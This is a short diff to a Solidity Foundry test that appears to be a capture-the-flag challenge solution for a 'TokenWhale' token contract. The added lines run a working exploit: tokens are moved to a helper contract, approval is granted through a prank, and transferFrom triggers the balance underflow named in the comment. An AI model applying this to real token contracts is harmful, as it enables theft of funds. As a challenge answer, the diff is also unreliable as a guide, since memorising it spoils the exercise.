@@ -24,6 +24,11 @@ contract TokenWhaleTest is Test {
     function testExploit() public {
         // Put your solution here
 
+        tokenWhale.transfer(address(exploitContract),510);
+        vm.prank(address(exploitContract));
+        tokenWhale.approve(address(this),600);
+        // overflow when balanceOf[msg.sender] -= value
+        tokenWhale.transferFrom(address(exploitContract),address(exploitContract),500);
         _checkSolved();
     }
 
